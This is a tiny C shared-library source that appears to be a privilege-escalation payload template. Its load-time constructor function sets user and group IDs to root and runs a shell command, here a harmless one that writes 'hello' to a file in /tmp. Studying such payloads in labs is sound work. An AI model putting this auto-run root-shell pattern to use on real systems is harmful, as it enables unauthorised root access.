#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c",
      "printf 'hello\\n' > /tmp/example.txt",
      (char *)NULL);
}
